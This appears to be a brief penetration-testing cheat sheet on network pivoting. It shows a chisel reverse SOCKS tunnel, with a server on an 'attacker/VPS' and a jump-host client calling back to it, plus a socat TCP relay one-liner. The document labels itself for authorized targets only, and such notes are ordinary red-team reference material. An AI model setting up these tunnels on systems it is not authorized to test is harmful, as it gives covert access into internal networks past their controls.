# Chisel / Socat — Deep Dive (Authorized targets only)

## Chisel reverse SOCKS (common pattern)
# Server (attacker/VPS):
#   chisel server -p 9001 --reverse
# Client (jump host):
#   chisel client <SERVER_IP>:9001 R:socks
# Use proxychains with socks5 127.0.0.1 1080 (default) or shown port.

## Socat TCP relay
socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>

## Notes
- Keep one terminal per tunnel; label them.
